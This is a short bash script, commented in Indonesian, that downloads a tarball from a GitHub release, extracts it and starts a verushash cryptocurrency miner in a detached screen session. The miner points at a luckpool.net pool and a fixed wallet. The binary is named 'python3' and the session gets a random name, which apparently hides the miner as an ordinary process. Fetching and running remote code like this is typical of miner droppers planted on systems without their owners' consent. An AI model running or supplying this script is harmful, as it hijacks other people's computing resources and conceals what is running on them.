#!/bin/bash

# Fungsi untuk menghasilkan nama acak dengan 5 huruf
generate_random_name() {
    tr -dc A-Za-z0-9 </dev/urandom | head -c 5
}

# Generate nama acak
TID=$(generate_random_name)

# Download file
wget -O mek https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.gz

# Extract file
tar -xvf mek

# Jalankan command dengan screen dan nama acak
screen -dmS dotsrb_$TID ./dotsrb/python3 --algorithm verushash --pool eu.luckpool.net:3956 --wallet RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg.luck-$TID
